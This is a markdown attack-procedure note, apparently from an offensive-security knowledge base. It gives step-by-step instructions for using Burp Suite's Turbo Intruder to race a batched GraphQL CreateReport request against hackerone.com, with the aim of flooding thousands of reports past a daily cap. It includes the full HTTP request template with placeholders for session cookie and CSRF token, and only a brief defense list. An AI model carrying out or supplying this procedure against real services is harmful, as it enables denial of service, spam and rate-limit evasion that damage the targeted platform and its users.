---
id: proc-turbo-race-001
tags:
  - race-condition
  - dos
  - turbo-intruder
type: procedure
tools:
  - '[[tools/Turbo-Intruder]]'
  - '[[tools/race-single-packet-attack.py]]'
tactics:
  - '[[Impact]]'
commands:
  - '[[commands/post-batched-report-request]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Network Denial of Service]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:29:57.225Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Impact]]'
mitre_techniques:
  - '[[Network Denial of Service]]'
  - '[[Exploit Public-Facing Application]]'
---
# Configure and Execute Turbo Intruder Race Attack

## Summary

This procedure forwards the batched GraphQL request to Turbo Intruder, configures a race condition script to repeat it 100 times rapidly, and executes to flood the API with ~7500 report creations, bypassing time-based rate limits.

## Description

By sending requests in quick succession via a race condition, this exploits the API's lack of batched request rate limiting. Each iteration submits 75 reports, overwhelming the 500-report daily cap. The script uses single-packet timing to evade sequential processing delays.

## Requirements

1. Burp Suite with prepared request
2. Turbo Intruder extension installed in Burp
3. race-single-packet-attack.py script available
4. Valid authentication in the request

## Defense

Defensive measures and detection strategies:

- Apply global rate limiting on GraphQL requests (e.g., 10/sec per IP)
- Monitor for concurrent bursts from tools like Turbo Intruder via user-agent or timing anomalies

## Objectives

1. Automate rapid repetition of batched requests
2. Exploit race to create reports before limits apply
3. Achieve high-volume spam in minimal time

## Instructions

### Step 1: Forward to Turbo Intruder

**Context**: Send the Burp request to Turbo Intruder for automation.

In Burp, right-click the request and select "Send to Turbo Intruder".

> Loads the request into Turbo Intruder interface. Expected output: Request template visible in the tool.

### Step 2: Load and Modify Script

**Context**: Configure the race condition script for 100 iterations.

Load race-single-packet-attack.py into Turbo Intruder's script pane. Edit the loop to run 100 times (e.g., for i in range(100):).

The script sends the request in rapid succession using threading or async for race effect.

> Adjusts for ~7500 total attempts (100 x 75). Expected output: Script syntax validated, no errors.

### Step 3: Start Attack

**Context**: Execute to perform the DoS via batch spam.

Click "Attack" in Turbo Intruder to run the script.

**Command** ([[commands/post-batched-report-request]]):

The underlying request is:

```http
POST /graphql HTTP/2
Host: hackerone.com
Cookie: {your-h1-cookie}
Content-Length: 1173
Sec-Ch-Ua: "Chromium";v="117", "Not;A=Brand";v="8"
X-Csrf-Token: {your-csrf-token}
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36
Content-Type: application/json
X-Product-Feature: inbox
Accept: */*
X-Product-Area: reports
Sec-Ch-Ua-Platform: "Linux"
Origin: https://hackerone.com
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9

{
  "operationName": "CreateReport",
  "variables": {
    "team_handle": "{target-team-handle}",
    "product_area": "reports",
    "product_feature": "inbox"
  },
  "query": "{your-generated-query}"
}
```

> Runs 100 iterations, each potentially creating 75 reports. Expected output: Console logs showing successes, total ~6400 reports after 40s.

## MITRE ATT&CK Mapping

### Tactics

- [[Impact]] Impact

### Techniques

- [[Network Denial of Service]] Network Denial of Service
- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used

- [[commands/post-batched-report-request]]

## Tools Used

- [[tools/Turbo-Intruder]]
- [[tools/race-single-packet-attack.py]]

## Tags

- race-condition
- dos
- turbo-intruder
